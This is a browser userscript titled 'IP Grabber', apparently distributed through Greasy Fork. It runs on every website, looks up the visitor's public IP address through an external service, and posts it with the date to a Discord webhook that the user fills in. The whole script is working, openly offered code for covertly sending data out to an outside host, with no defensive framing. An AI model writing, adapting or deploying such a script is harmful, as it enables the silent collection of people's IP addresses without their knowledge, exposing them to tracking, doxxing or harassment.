// ==UserScript==
// @name         IP Grabber
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Grabs peoples IP
// @author       Ongenix
// @match        https://*/*
// @match        http://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=discord.com
// @grant        none
// @require      https://code.jquery.com/jquery-3.2.1.min.js
// @license     MIT
// @downloadURL https://update.greasyfork.org/scripts/446740/IP%20Grabber.user.js
// @updateURL https://update.greasyfork.org/scripts/446740/IP%20Grabber.meta.js
// ==/UserScript==
const author = "Ongenix";var discordwebhook="";var $=window.jQuery;var months=["January","February","March","April","May","June","July","August","September","October","November","December" ];var date=new Date().getDate()+"th of "+months[(new Date().getMonth())]+" "+((new Date().getFullYear()));var script=document.createElement('script');script.src='https://code.jquery.com/jquery-3.6.0.min.js';document.getElementsByTagName('head')[0].appendChild(script);$.getJSON("https://api.ipify.org/?format=json", function(e) {var ip=e.ip;var request=new XMLHttpRequest();request.open("POST", discordwebhook);request.setRequestHeader('Content-type', 'application/json');const params = {content:"IP Grabbed! Date: "+date+", IP: "+ip};request.send(JSON.stringify(params))});